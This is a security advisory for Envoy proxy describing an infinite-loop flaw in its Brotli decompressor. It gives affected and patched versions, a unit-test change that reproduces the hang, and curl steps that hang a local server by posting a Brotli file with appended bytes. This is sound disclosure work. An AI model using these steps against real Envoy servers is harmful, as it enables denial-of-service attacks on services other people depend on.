# Endless loop while decompressing Brotli data with extra input

High

[phlax](/phlax)
published
GHSA-7wp5-c2vq-4f8m
Jun 4, 2024

## Package

brotli\_decompressor\_impl.cc
(Envoyproxy)

## Affected versions

>1.18.0, < 1.30.2

## Patched versions

1.30.2, 1.29.5, 1.28.4, 1.27.6

## Description

### Summary

Envoyproxy with a Brotli filter can get into an endless loop during decompression of Brotli data with extra input.

### Details

The `decompress` method will keep processing the data as long as there is available input.

Once the original compressed data (up to the extra input) is decoded, additional calls to the Brotli lib will not trigger an error and will keep the available data unchanged, and causing an infinite loop.

A reference to how this use case was handled in the brotli cli tool, can be found here:

<https://github.com/google/brotli/blob/adbc354d23af714a557730cc0e15fc38909e4ef0/c/tools/brotli.c#L1253>

### PoC

To reproduce using an existing unit test `BrotliDecompressorImplTest.CompressAndDecompress`

[envoy/test/extensions/compression/brotli/decompressor/brotli\_decompressor\_impl\_test.cc](https://github.com/envoyproxy/envoy/blob/9b01aaf6ed62948649b192f2bc4b5eee79af35c5/test/extensions/compression/brotli/decompressor/brotli_decompressor_impl_test.cc#L82)

[9b01aaf](/envoyproxy/envoy/commit/9b01aaf6ed62948649b192f2bc4b5eee79af35c5)

|  | accumulation\_buffer.add(buffer); |
| --- | --- |

After the line:
```
accumulation_buffer.add(buffer);`
```

Add the line:

```
accumulation_buffer.add("ABCDE");
```

To reproduce with a running envoyproxy, use the configuration below that is set to decompress requests to localhost:10000 and forward them to httpbin.org.

Note that the configuration also includes a buffer filter as recommended here: <https://www.envoyproxy.io/docs/envoy/latest/configuration/http/http_filters/decompressor_filter>

* Compress a file with brotli:
  ```
  $ brotli file.json -o file.json.br
  ```
* Verify you are able to send the data in the file to the server.
  ```
  $ curl -d "@file.json.br" -H "Content-Type: application/json"  -H "Content-Encoding: br" -X POST localhost:10000/anything
  ```
* Append data to the end of the file.
  ```
  echo "12345" >> file.json.br
  ```
* See that local decompression is failing on the new file.
  ```
  brotli -d file.json.br
  >>corrupt input [file.json.br]
  ```
* Try to send the new data to the server
  ```
  curl -d "@file.json.br" -H "Content-Type: application/json"  -H "Content-Encoding: br" -X POST localhost:10000/anything
  ```
* The curl request should now be stuck!

```
### Impact

The above can easily be used as a DOS/DDOS attack on any EnvoyProxy server that uses the Brotli filter.

### Mitigation

Avoid use of brotli filter or update to version with fixes

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
